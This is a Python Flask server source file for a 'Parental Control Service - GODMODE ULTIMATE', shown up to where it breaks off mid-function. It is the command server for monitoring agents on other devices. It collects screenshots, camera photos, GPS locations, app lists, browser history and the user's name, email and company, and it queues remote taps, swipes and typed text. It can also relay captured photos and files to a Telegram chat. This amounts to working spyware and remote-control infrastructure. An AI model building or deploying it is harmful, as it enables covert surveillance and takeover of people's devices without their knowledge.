#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Parental Control Service - GODMODE ULTIMATE v12.0
+ 6-digit PIN authentication (parent dashboard)
+ Agent PIN authentication (agents → server)
+ Session cookies + rate limiting
+ Full remote control (tap/swipe/scroll/hotkeys/launch)
+ Telegram integration: send screenshots, camera photos, files, apps list, text
"""

import os
import sys
import json
import time
import uuid
import hmac
import secrets
import threading
import platform
import socket
import base64
import logging
import subprocess
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from collections import defaultdict, deque
from functools import wraps
from flask import (
    Flask, request, jsonify, send_file, send_from_directory,
    make_response, abort
)
from flask_cors import CORS

# ============================================================
# CONFIGURATION
# ============================================================

IS_WINDOWS = platform.system() == 'Windows'

BASE_DIR = Path.home() / '.parental_control'
SCREENSHOT_DIR = BASE_DIR / 'screenshots'
LOGS_DIR = BASE_DIR / 'logs'
DATA_DIR = BASE_DIR / 'data'
CAMERA_DIR = BASE_DIR / 'camera'
FILES_DIR = BASE_DIR / 'files'
UPLOAD_DIR = BASE_DIR / 'uploads'
DEVICE_DIR = BASE_DIR / 'devices'

for dir_path in [BASE_DIR, SCREENSHOT_DIR, LOGS_DIR, DATA_DIR, CAMERA_DIR, FILES_DIR, UPLOAD_DIR, DEVICE_DIR]:
    dir_path.mkdir(parents=True, exist_ok=True)

# ============================================================
# WEB DIRECTORY
# ============================================================

IS_RENDER = os.environ.get('RENDER', 'false').lower() == 'true'

if IS_RENDER:
    WEB_DIR = Path('/opt/render/project/src/web/public')
else:
    SCRIPT_DIR = Path(__file__).parent
    PROJECT_DIR = SCRIPT_DIR.parent
    WEB_DIR = PROJECT_DIR / 'web' / 'public'

WEB_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================
# LOGGER
# ============================================================

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================
# AUTH CONFIG — 6-digit PINs from environment
# ============================================================

PARENT_PIN = os.environ.get('PARENT_PIN', '').strip()
AGENT_PIN  = os.environ.get('AGENT_PIN',  '').strip()

if not PARENT_PIN:
    logger.warning("⚠️ PARENT_PIN not set — dashboard is UNPROTECTED")
elif not PARENT_PIN.isdigit() or len(PARENT_PIN) != 6:
    logger.error("❌ PARENT_PIN must be exactly 6 digits")
    PARENT_PIN = ""

if not AGENT_PIN:
    logger.warning("⚠️ AGENT_PIN not set — agents are UNPROTECTED")
elif not AGENT_PIN.isdigit() or len(AGENT_PIN) != 6:
    logger.error("❌ AGENT_PIN must be exactly 6 digits")
    AGENT_PIN = ""

# Session storage
sessions = {}
SESSION_TTL = 24 * 3600
SESSION_COOKIE = "rc_session"

# Login rate limiting
login_attempts = defaultdict(list)
MAX_LOGIN_ATTEMPTS = 5
LOGIN_WINDOW = 300

# ============================================================
# FLASK APP
# ============================================================

app = Flask(__name__)

ALLOWED_ORIGINS = [
    'https://service-ur14.onrender.com',
    'http://localhost:5001',
    'http://127.0.0.1:5001',
]
CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)

# ============================================================
# DATA STORE
# ============================================================

devices = {}
screenshots = []
camera_photos = []
locations = []
app_usage = []
installed_apps = {}
browser_history = []
activities = []
activity_counter = 0
device_screens = {}

command_queues = defaultdict(deque)
command_results = {}
control_devices = {}

ping_thread = None
ping_running = False
ping_interval = 240

# ============================================================
# UTILITY
# ============================================================

def add_activity(action: str, details: str, device_id: str = "unknown"):
    global activity_counter
    activity_counter += 1
    activities.append({
        'id': activity_counter,
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'details': details,
        'device_id': device_id,
        'type': 'info'
    })
    if len(activities) > 500:
        activities[:] = activities[-500:]

def safe_filename(name: str) -> str:
    import re
    name = os.path.basename(name or "")
    name = re.sub(r'[^\w.\-]', '_', name)
    if not name or name in ('.', '..'):
        name = 'invalid'
    return name

def _safe_eq(a: str, b: str) -> bool:
    try:
        return hmac.compare_digest(str(a).encode(), str(b).encode())
    except Exception:
        return False

# ============================================================
# AUTH
# ============================================================

def _client_ip() -> str:
    xff = request.headers.get('X-Forwarded-For', '')
    if xff:
        return xff.split(',')[0].strip()
    return request.remote_addr or 'unknown'

def _create_session() -> str:
    token = secrets.token_urlsafe(32)
    sessions[token] = {'ip': _client_ip(), 'created': time.time()}
    return token

def _is_valid_session(token: str) -> bool:
    if not token:
        return False
    s = sessions.get(token)
    if not s:
        return False
    if time.time() - s['created'] > SESSION_TTL:
        sessions.pop(token, None)
        return False
    return True

def _check_login_rate(ip: str) -> bool:
    now = time.time()
    bucket = login_attempts[ip]
    bucket[:] = [t for t in bucket if now - t < LOGIN_WINDOW]
    return len(bucket) < MAX_LOGIN_ATTEMPTS

def _record_login_attempt(ip: str):
    login_attempts[ip].append(time.time())

def _server_token_from_request():
    h = request.headers.get('X-Server-Token')
    if h:
        return h
    s = request.cookies.get(SESSION_COOKIE)
    if s:
        return s
    return request.args.get('token', '')

def require_parent_auth(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not PARENT_PIN:
            return f(*args, **kwargs)
        token = _server_token_from_request()
        if _is_valid_session(token):
            return f(*args, **kwargs)
        return jsonify({'success': False, 'error': 'unauthorized'}), 401
    return wrapper

def require_agent_auth(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not AGENT_PIN:
            return f(*args, **kwargs)
        pin = (
            request.headers.get('X-Agent-Pin')
            or request.args.get('pin')
            or ((request.json or {}).get('pin') if request.is_json else None)
        )
        if _safe_eq(pin, AGENT_PIN):
            return f(*args, **kwargs)
        logger.warning(f"🚫 Agent auth failed from {_client_ip()} on {request.path}")
        return jsonify({'success': False, 'error': 'unauthorized'}), 401
    return wrapper

# ============================================================
# RATE LIMITING
# ============================================================

rate_buckets = defaultdict(list)
RATE_LIMITS = {
    'default':   (120, 60),
    'control':   (180, 60),
    'screenshot':(180, 60),
    'login':     (10, 300),
    'telegram':  (30, 60),   # Telegram sends limited to 30 per minute
}

def rate_limit(category='default'):
    def deco(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            limit, window = RATE_LIMITS.get(category, RATE_LIMITS['default'])
            key = f"{category}:{_client_ip()}"
            now = time.time()
            bucket = rate_buckets[key]
            bucket[:] = [t for t in bucket if now - t < window]
            if len(bucket) >= limit:
                return jsonify({'success': False, 'error': 'rate limit exceeded'}), 429
            bucket.append(now)
            return f(*args, **kwargs)
        return wrapper
    return deco

# ============================================================
# SELF-PING
# ============================================================

def get_server_url():
    if IS_RENDER:
        render_url = os.environ.get('RENDER_EXTERNAL_URL', '')
        if render_url:
            return render_url.rstrip('/')
        return 'https://service-ur14.onrender.com'
    return 'http://localhost:5001'

def ping_server():
    global ping_running
    url = f"{get_server_url()}/api/health"
    while ping_running:
        try:
            req = urllib.request.Request(url, method='GET')
            req.add_header('User-Agent', 'SelfPing/1.0')
            with urllib.request.urlopen(req, timeout=30) as response:
                if response.status == 200:
                    logger.debug(f"✅ Self-ping OK: {url}")
        except Exception as e:
            logger.warning(f"⚠️ Self-ping failed: {e}")
        time.sleep(ping_interval)

def start_ping_system():
    global ping_thread, ping_running
    if ping_running:
        return
    ping_running = True
    ping_thread = threading.Thread(target=ping_server, daemon=True)
    ping_thread.start()
    logger.info(f"🔄 Self-ping started ({get_server_url()})")

# ============================================================
# TELEGRAM INTEGRATION
# ============================================================

TELEGRAM_CONFIG_FILE = DATA_DIR / "telegram.json"

telegram_config = {
    "bot_token": "",
    "chat_id": "",
    "enabled": False,
}

def _load_telegram_config():
    global telegram_config
    try:
        if TELEGRAM_CONFIG_FILE.exists():
            with open(TELEGRAM_CONFIG_FILE, "r", encoding="utf-8") as f:
                saved = json.load(f)
                telegram_config.update(saved)
            logger.info(f"📲 Telegram config loaded (enabled={telegram_config['enabled']})")
    except Exception as e:
        logger.warning(f"Telegram config load failed: {e}")

def _save_telegram_config():
    try:
        with open(TELEGRAM_CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(telegram_config, f, indent=2)
    except Exception as e:
        logger.error(f"Telegram config save failed: {e}")

_load_telegram_config()

def _telegram_api_url(method: str) -> str:
    return f"https://api.telegram.org/bot{telegram_config['bot_token']}/{method}"

def _telegram_send_message(text: str, parse_mode: str = "HTML") -> dict:
    if not telegram_config.get("enabled") or not telegram_config.get("bot_token") or not telegram_config.get("chat_id"):
        return {"success": False, "error": "Telegram not configured"}
    try:
        import urllib.parse
        url = _telegram_api_url("sendMessage")
        payload = urllib.parse.urlencode({
            "chat_id": telegram_config["chat_id"],
            "text": text[:4096],
            "parse_mode": parse_mode,
            "disable_web_page_preview": "true",
        }).encode("utf-8")
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with urllib.request.urlopen(req, timeout=30) as r:
            body = json.loads(r.read().decode("utf-8"))
            return {"success": bool(body.get("ok")), "result": body}
    except urllib.error.HTTPError as he:
        try:
            err_body = he.read().decode("utf-8")
            logger.error(f"Telegram sendMessage HTTP {he.code}: {err_body[:300]}")
            return {"success": False, "error": f"HTTP {he.code}", "details": err_body[:300]}
        except Exception:
            return {"success": False, "error": f"HTTP {he.code}"}
    except Exception as e:
        logger.error(f"Telegram sendMessage error: {e}")
        return {"success": False, "error": str(e)}

def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "") -> dict:
    if not telegram_config.get("enabled") or not telegram_config.get("bot_token") or not telegram_config.get("chat_id"):
        return {"success": False, "error": "Telegram not configured"}
    if not filepath.exists():
        return {"success": False, "error": "File not found"}

    try:
        import mimetypes
        boundary = "----TelegramBoundary" + secrets.token_hex(16)
        mime = mimetypes.guess_type(str(filepath))[0] or "application/octet-stream"

        parts = []
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
        parts.append(f"{telegram_config['chat_id']}\r\n".encode())

        if caption:
            parts.append(f"--{boundary}\r\n".encode())
            parts.append(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
            parts.append(f"{caption[:1024]}\r\n".encode())
            parts.append(f"--{boundary}\r\n".encode())
            parts.append(b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n')
            parts.append(b"HTML\r\n")

        parts.append(f"--{boundary}\r\n".encode())
        parts.append(f'Content-Disposition: form-data; name="{field}"; filename="{filepath.name}"\r\n'.encode())
        parts.append(f"Content-Type: {mime}\r\n\r\n".encode())
        with open(filepath, "rb") as f:
            parts.append(f.read())
        parts.append(f"\r\n--{boundary}--\r\n".encode())

        body = b"".join(parts)
        url = _telegram_api_url(endpoint)
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        req.add_header("Content-Length", str(len(body)))

        with urllib.request.urlopen(req, timeout=120) as r:
            resp = json.loads(r.read().decode("utf-8"))
            return {"success": bool(resp.get("ok")), "result": resp}
    except urllib.error.HTTPError as he:
        try:
            err_body = he.read().decode("utf-8")
            logger.error(f"Telegram {endpoint} HTTP {he.code}: {err_body[:300]}")
            return {"success": False, "error": f"HTTP {he.code}", "details": err_body[:300]}
        except Exception:
            return {"success": False, "error": f"HTTP {he.code}"}
    except Exception as e:
        logger.error(f"Telegram {endpoint} error: {e}")
        return {"success": False, "error": str(e)}

def _telegram_send_photo(filepath: Path, caption: str = "") -> dict:
    return _telegram_upload("sendPhoto", "photo", filepath, caption)

def _telegram_send_document(filepath: Path, caption: str = "") -> dict:
    return _telegram_upload("sendDocument", "document", filepath, caption)

# ============================================================
# AUTH ENDPOINTS
# ============================================================

@app.route('/api/auth/login', methods=['POST', 'OPTIONS'])
@rate_limit('login')
def auth_login():
    if request.method == 'OPTIONS':
        return '', 204

    if not PARENT_PIN:
        token = _create_session()
        resp = make_response(jsonify({'success': True, 'dev_mode': True}))
        resp.set_cookie(SESSION_COOKIE, token, httponly=True, samesite='Lax', max_age=SESSION_TTL)
        return resp

    ip = _client_ip()
    if not _check_login_rate(ip):
        return jsonify({
            'success': False,
            'error': 'too many attempts — try again later',
            'retry_after': LOGIN_WINDOW
        }), 429

    data = request.json or {}
    pin = str(data.get('pin', '')).strip()

    if not pin.isdigit() or len(pin) != 6:
        _record_login_attempt(ip)
        return jsonify({'success': False, 'error': 'PIN must be 6 digits'}), 400

    if not _safe_eq(pin, PARENT_PIN):
        _record_login_attempt(ip)
        logger.warning(f"🚫 Wrong PIN from {ip}")
        return jsonify({'success': False, 'error': 'incorrect PIN'}), 401

    token = _create_session()
    logger.info(f"✅ Login success from {ip}")
    add_activity('login', f'Parent login from {ip}')
    resp = make_response(jsonify({'success': True}))
    resp.set_cookie(
        SESSION_COOKIE, token,
        httponly=True, samesite='Lax',
        secure=IS_RENDER, max_age=SESSION_TTL
    )
    return resp

@app.route('/api/auth/logout', methods=['POST'])
def auth_logout():
    token = request.cookies.get(SESSION_COOKIE, '')
    sessions.pop(token, None)
    resp = make_response(jsonify({'success': True}))
    resp.delete_cookie(SESSION_COOKIE)
    return resp

@app.route('/api/auth/verify', methods=['GET'])
def auth_verify():
    if not PARENT_PIN:
        return jsonify({'success': True, 'valid': True, 'dev_mode': True})
    token = _server_token_from_request()
    if _is_valid_session(token):
        return jsonify({'success': True, 'valid': True})
    return jsonify({'success': False, 'valid': False}), 401

@app.route('/api/auth/status', methods=['GET'])
def auth_status():
    return jsonify({
        'success': True,
        'requires_pin': bool(PARENT_PIN),
        'has_session': _is_valid_session(request.cookies.get(SESSION_COOKIE, '')),
    })

# ============================================================
# SERVE WEB UI
# ============================================================

@app.route('/')
def serve_index():
    index_path = WEB_DIR / 'index.html'
    if index_path.exists():
        return send_from_directory(str(WEB_DIR), 'index.html')
    return get_fallback_html()

@app.route('/index.html')
def serve_index_html():
    index_path = WEB_DIR / 'index.html'
    if index_path.exists():
        return send_from_directory(str(WEB_DIR), 'index.html')
    return get_fallback_html()

@app.route('/<path:path>')
def serve_static(path):
    file_path = WEB_DIR / path
    if file_path.exists() and file_path.is_file():
        return send_from_directory(str(WEB_DIR), path)
    return jsonify({"error": "File not found"}), 404

def get_fallback_html():
    return '''<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
    <h1>🛡️ Parental Control v12.0</h1>
    <p>index.html not found. Please upload it to web/public/</p>
    </body></html>'''

# ============================================================
# HEALTH
# ============================================================

@app.route('/api/health', methods=['GET'])
def health_check():
    now = time.time()
    online_agents = sum(1 for ts in control_devices.values() if now - ts < 10)
    return jsonify({
        "success": True,
        "service": "Parental Control API",
        "status": "running",
        "version": "12.0.0",
        "platform": platform.system(),
        "devices": len(devices),
        "online_agents": online_agents,
        "is_render": IS_RENDER,
        "requires_pin": bool(PARENT_PIN),
        "telegram_enabled": telegram_config.get("enabled", False),
        "self_ping": ping_running,
        "timestamp": datetime.now().isoformat()
    })

# ============================================================
# STATUS & DEVICES
# ============================================================

@app.route('/api/status', methods=['GET'])
@require_parent_auth
def get_status():
    user_info = {}
    if devices:
        first = list(devices.values())[0]
        user_info = {
            'full_name': first.get('name', ''),
            'email': first.get('email', ''),
            'company': first.get('company', ''),
            'computer_name': first.get('model', 'Unknown'),
            'device_count': len(devices)
        }
    now = time.time()
    online_states = {d: (now - ts < 10) for d, ts in control_devices.items()}
    return jsonify({
        "success": True,
        "is_running": True,
        "active_children": list(devices.keys()),
        "platform": platform.system(),
        "user_info": user_info,
        "online_agents": online_states,
        "stats": {
            "screenshots": len(screenshots),
            "camera_photos": len(camera_photos),
            "locations": len(locations),
            "app_usage": len(app_usage),
            "installed_apps": sum(len(v) for v in installed_apps.values()),
            "devices": len(devices),
            "control_devices": len(control_devices)
        },
        "devices": devices,
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/devices', methods=['GET'])
@require_parent_auth
def get_devices():
    now = time.time()
    enriched = {}
    for did, info in devices.items():
        d = dict(info)
        d['online'] = (now - control_devices.get(did, 0)) < 10
        enriched[did] = d
    return jsonify({"success": True, "devices": enriched})

# ============================================================
# SCREENSHOTS
# ============================================================

@app.route('/api/screenshots', methods=['GET'])
@require_parent_auth
def list_screenshots():
    limit = request.args.get('limit', 50, type=int)
    device_id = request.args.get('deviceId', '')
    all_shots = []
    for directory in [SCREENSHOT_DIR, UPLOAD_DIR]:
        for pattern in ('*.png', '*.jpg'):
            for file in directory.glob(pattern):
                try:
                    stat = file.stat()
                    all_shots.append({
                        'filename': file.name,
                        'timestamp': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        'size': stat.st_size,
                        'url': f'/api/screenshots/{file.name}'
                    })
                except Exception:
                    pass
    all_shots.sort(key=lambda x: x['timestamp'], reverse=True)
    return jsonify(all_shots[:limit])

@app.route('/api/screenshots/<filename>', methods=['GET'])
def get_screenshot(filename):
    if PARENT_PIN:
        token = _server_token_from_request()
        if not _is_valid_session(token):
            return jsonify({"error": "unauthorized"}), 401
    filename = safe_filename(filename)
    for directory in [SCREENSHOT_DIR, UPLOAD_DIR]:
        filepath = directory / filename
        if filepath.exists():
            mime = 'image/png' if filename.endswith('.png') else 'image/jpeg'
            return send_file(filepath, mimetype=mime)
    return jsonify({"error": "File not found"}), 404

# ============================================================
# CAMERA
# ============================================================

@app.route('/api/camera/photos', methods=['GET'])
@require_parent_auth
def list_camera_photos():
    limit = request.args.get('limit', 50, type=int)
    photos = []
    for directory in [CAMERA_DIR, UPLOAD_DIR]:
        for file in directory.glob('*.jpg'):
            try:
                stat = file.stat()
                photos.append({
                    'filename': file.name,
                    'timestamp': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                    'size': stat.st_size,
                    'url': f'/api/camera/photos/{file.name}'
                })
            except Exception:
                pass
    photos.sort(key=lambda x: x['timestamp'], reverse=True)
    return jsonify(photos[:limit])

@app.route('/api/camera/photos/<filename>', methods=['GET'])
def get_camera_photo(filename):
    if PARENT_PIN:
        token = _server_token_from_request()
        if not _is_valid_session(token):
            return jsonify({"error": "unauthorized"}), 401
    filename = safe_filename(filename)
    for directory in [CAMERA_DIR, UPLOAD_DIR]:
        filepath = directory / filename
        if filepath.exists():
            return send_file(filepath, mimetype='image/jpeg')
    return jsonify({"error": "File not found"}), 404

# ============================================================
# FILES / ACTIVITY / APPS
# ============================================================

@app.route('/api/files/list', methods=['GET'])
@require_parent_auth
def list_files():
    limit = request.args.get('limit', 50, type=int)
    files = []
    for file in sorted(FILES_DIR.glob('*'), key=lambda x: x.stat().st_mtime, reverse=True)[:limit]:
        files.append({
            'name': file.name,
            'size': file.stat().st_size,
            'size_formatted': f"{file.stat().st_size / 1024:.1f} KB",
            'modified': datetime.fromtimestamp(file.stat().st_mtime).isoformat()
        })
    return jsonify(files)

@app.route('/api/activity', methods=['GET'])
@require_parent_auth
def get_activity():
    limit = request.args.get('limit', 20, type=int)
    return jsonify({
        "success": True,
        "activities": activities[-limit:],
        "count": len(activities)
    })

@app.route('/api/apps', methods=['GET'])
@require_parent_auth
def get_apps():
    device_id = request.args.get('deviceId', '')
    limit = request.args.get('limit', 50, type=int)
    if device_id and device_id in installed_apps:
        return jsonify(installed_apps[device_id])
    if installed_apps:
        for apps in installed_apps.values():
            return jsonify(apps)
    return jsonify(app_usage[-limit:])

@app.route('/api/apps/list', methods=['GET'])
@require_parent_auth
def apps_list():
    device_id = request.args.get('deviceId', '')
    if device_id and device_id in installed_apps:
        return jsonify(installed_apps[device_id])
    for did, apps in installed_apps.items():
        return jsonify(apps)
    return jsonify([])

@app.route('/api/apps/search', methods=['GET'])
@require_parent_auth
def apps_search():
    q = request.args.get('q', '').lower()
    device_id = request.args.get('deviceId', '')
    if not q:
        return jsonify([])
    source = installed_apps.get(device_id, [])
    if not source:
        for apps in installed_apps.values():
            source = apps
            break
    results = [a for a in source
               if q in a.get('label', '').lower()
               or q in a.get('package', '').lower()
               or q in a.get('name', '').lower()]
    return jsonify(results[:20])

@app.route('/api/locations', methods=['GET'])
@require_parent_auth
def get_locations():
    limit = request.args.get('limit', 50, type=int)
    return jsonify(locations[-limit:])

@app.route('/api/user', methods=['GET'])
@require_parent_auth
def get_user():
    for device_id, info in devices.items():
        return jsonify({
            "success": True,
            "full_name": info.get('name', 'User'),
            "email": info.get('email', ''),
            "company": info.get('company', ''),
            "computer_name": info.get('model', 'Unknown'),
            "device_id": device_id
        })
    return jsonify({"success": True, "full_name": "Unknown"})

@app.route('/api/system/info', methods=['GET'])
@require_parent_auth
def system_info():
    return jsonify({
        "success": True,
        "platform": platform.system(),
        "hostname": socket.gethostname(),
        "python_version": sys.version.split()[0],
        "is_render": IS_RENDER
    })

@app.route('/api/browser', methods=['GET'])
@require_parent_auth
def get_browser():
    limit = request.args.get('limit', 50, type=int)
    return jsonify(browser_history[-limit:])

@app.route('/api/start', methods=['POST'])
@require_parent_auth
def start_monitoring():
    add_activity('start', 'Monitoring started')
    return jsonify({"success": True, "status": "started"})

@app.route('/api/stop', methods=['POST'])
@require_parent_auth
def stop_monitoring():
    add_activity('stop', 'Monitoring stopped')
    return jsonify({"success": True, "status": "stopped"})

@app.route('/api/debug/webdir', methods=['GET'])
@require_parent_auth
def debug_webdir():
    try:
        files = list(WEB_DIR.glob('*'))
        return jsonify({
            "web_dir": str(WEB_DIR),
            "exists": WEB_DIR.exists(),
            "files": [f.name for f in files],
            "index_exists": (WEB_DIR / 'index.html').exists()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/ping/status', methods=['GET'])
@require_parent_auth
def ping_status():
    return jsonify({
        "success": True,
        "ping_running": ping_running,
        "ping_interval": ping_interval
    })

# ============================================================
# AGENT MONITORING ENDPOINTS
# ============================================================

@app.route('/api/monitor/user', methods=['POST'])
@require_agent_auth
def monitor_user():
    try:
        data = request.json or {}
        device_id = data.get('deviceId', 'unknown')
        devices[device_id] = {
            'id': device_id,
            'name': data.get('name', 'User'),
            'email': data.get('email', ''),
            'company': data.get('company', ''),
            'model': data.get('deviceModel', 'Unknown'),
            'android_version': data.get('androidVersion', data.get('os_version', 'Unknown')),
            'public_ip': data.get('public_ip', ''),
            'hostname': data.get('hostname', data.get('deviceModel', 'Unknown')),
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'status': 'active'
        }
        add_activity('user_registered', f"{data.get('name','User')} from {data.get('deviceModel','Unknown')}", device_id)
        logger.info(f"✅ User registered: {data.get('name')} ({data.get('deviceModel')})")
        return jsonify({"success": True, "device_id": device_id})
    except Exception as e:
        logger.error(f"User error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/monitor/screenshot', methods=['POST'])
@require_agent_auth
@rate_limit('screenshot')
def monitor_screenshot():
    try:
        data = request.json or {}
        filename = safe_filename(data.get('filename', f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'))
        image_data = data.get('data')
        device_id = data.get('deviceId', 'unknown')
        width = data.get('width', 0)
        height = data.get('height', 0)

        if not image_data:
            return jsonify({"success": False, "error": "No image data"}), 400

        image_bytes = base64.b64decode(image_data)
        filepath = UPLOAD_DIR / filename
        with open(filepath, 'wb') as f:
            f.write(image_bytes)

        if device_id in devices:
            devices[device_id]['last_seen'] = datetime.now().isoformat()

        if width > 0 and height > 0:
            device_screens[device_id] = {'width': width, 'height': height}

        screenshots.append({
            'filename': filename,
            'device_id': device_id,
            'device_model': data.get('deviceModel', 'Unknown'),
            'timestamp': datetime.now().isoformat(),
            'size': filepath.stat().st_size,
            'width': width,
            'height': height,
            'url': f'/api/screenshots/{filename}'
        })
        if len(screenshots) > 500:
            screenshots[:] = screenshots[-500:]

        logger.info(f"📸 Screenshot: {filename} ({len(image_bytes)}b) from {device_id[:8]}")
        return jsonify({"success": True, "filename": filename})
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/monitor/camera', methods=['POST'])
@require_agent_auth
def monitor_camera():
    try:
        data = request.json or {}
        filename = safe_filename(data.get('filename', f'camera_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'))
        image_data = data.get('data')
        device_id = data.get('deviceId', 'unknown')
        if not image_data:
            return jsonify({"success": False, "error": "No image data"}), 400
        image_bytes = base64.b64decode(image_data)
        filepath = UPLOAD_DIR / filename
        with open(filepath, 'wb') as f:
            f.write(image_bytes)
        if device_id in devices:
            devices[device_id]['last_seen'] = datetime.now().isoformat()
        camera_photos.append({
            'filename': filename,
            'device_id': device_id,
            'timestamp': datetime.now().isoformat(),
            'url': f'/api/camera/photos/{filename}'
        })
        return jsonify({"success": True, "filename": filename})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/monitor/location', methods=['POST'])
@require_agent_auth
def monitor_location():
    try:
        data = request.json or {}
        device_id = data.get('deviceId', 'unknown')
        lat = data.get('latitude'); lon = data.get('longitude')
        if lat is None or lon is None:
            return jsonify({"success": False, "error": "No location"}), 400
        if device_id in devices:
            devices[device_id]['last_seen'] = datetime.now().isoformat()
        locations.append({
            'device_id': device_id,
            'latitude': lat, 'longitude': lon,
            'accuracy': data.get('accuracy', 0),
            'timestamp': datetime.now().isoformat()
        })
        if len(locations) > 500:
            locations[:] = locations[-500:]
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/monitor/apps', methods=['POST'])
@require_agent_auth
def monitor_apps():
    try:
        data = request.json or {}
        device_id = data.get('deviceId', 'unknown')
        apps = data.get('apps', [])
        if device_id in devices:
            devices[device_id]['last_seen'] = datetime.now().isoformat()
        if apps and isinstance(apps[0], dict) and 'label' in apps[0]:
            installed_apps[device_id] = apps
            logger.info(f"📱 Installed apps: {len(apps)} from {device_id[:8]}")
        else:
            app_usage.append({
                'device_id': device_id, 'apps': apps,
                'count': len(apps), 'timestamp': datetime.now().isoformat()
            })
            if len(app_usage) > 500:
                app_usage[:] = app_usage[-500:]
        return jsonify({"success": True, "count": len(apps)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/monitor/running-apps', methods=['POST'])
@require_agent_auth
def monitor_running_apps():
    try:
        data = request.json or {}
        device_id = data.get('deviceId', 'unknown')
        apps = data.get('apps', [])
        if device_id in devices:
            devices[device_id]['last_seen'] = datetime.now().isoformat()
        app_usage.append({
            'device_id': device_id, 'apps': apps,
            'count': len(apps), 'timestamp': datetime.now().isoformat()
        })
        if len(app_usage) > 500:
            app_usage[:] = app_usage[-500:]
        return jsonify({"success": True, "count": len(apps)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/monitor/screen-info', methods=['POST'])
@require_agent_auth
def monitor_screen_info():
    try:
        data = request.json or {}
        device_id = data.get('deviceId', 'unknown')
        device_screens[device_id] = {
            'width': data.get('width', 1080),
            'height': data.get('height', 2400),
            'density': data.get('density', 0),
        }
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ============================================================
# REMOTE CONTROL
# ============================================================

def _enqueue(device_id: str, action: str, params: dict = None, ttl: float = 15.0) -> str:
    cmd_id = str(uuid.uuid4())
    item = {
        'id': cmd_id, 'action': action,
        'params': params or {}, 'created': time.time(), 'ttl': ttl,
    }
    command_queues[device_id].append(item)
    logger.info(f"🎮 Queued '{action}' for {device_id[:8]} (id={cmd_id[:8]})")
    return cmd_id

@app.route('/api/control/poll', methods=['GET', 'OPTIONS'])
@require_agent_auth
def control_poll():
    if request.method == 'OPTIONS':
        return '', 204
    device_id = request.args.get('deviceId', 'unknown')
    control_devices[device_id] = time.time()
    now = time.time()
    q = command_queues[device_id]
    fresh = deque(item for item in q if now - item['created'] <= item['ttl'])
    command_queues[device_id] = fresh
    return jsonify(list(fresh))

@app.route('/api/control/result', methods=['POST', 'OPTIONS'])
@require_agent_auth
def control_result():
    if request.method == 'OPTIONS':
        return '', 204
    data = request.json or {}
    cid = data.get('id')
    if cid:
        ok = bool(data.get('ok'))
        command_results[cid] = {
            'ok': ok, 'timestamp': time.time(),
            'deviceId': data.get('deviceId', 'unknown')
        }
        add_activity('control', f'Remote action {cid[:8]} → {"✅" if ok else "❌"}', data.get('deviceId', 'unknown'))
    return jsonify({'success': True})

@app.route('/api/control/tap', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_tap():
    d = request.json or {}
    cid = _enqueue(d.get('deviceId', 'unknown'), 'tap', {'x': d.get('x', 0), 'y': d.get('y', 0)})
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/longpress', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_longpress():
    d = request.json or {}
    cid = _enqueue(d.get('deviceId', 'unknown'), 'longpress', {'x': d.get('x', 0), 'y': d.get('y', 0)})
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/swipe', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_swipe():
    d = request.json or {}
    cid = _enqueue(d.get('deviceId', 'unknown'), 'swipe', {
        'x1': d.get('x1', 0), 'y1': d.get('y1', 0),
        'x2': d.get('x2', 0), 'y2': d.get('y2', 0),
        'duration': d.get('duration', 300),
    })
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/text', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_text():
    d = request.json or {}
    cid = _enqueue(d.get('deviceId', 'unknown'), 'text', {'text': d.get('text', '')})
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/backspace', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_backspace():
    d = request.json or {}
    cid = _enqueue(d.get('deviceId', 'unknown'), 'backspace', {})
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/key', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_key():
    d = request.json or {}
    key = d.get('key', 'home')
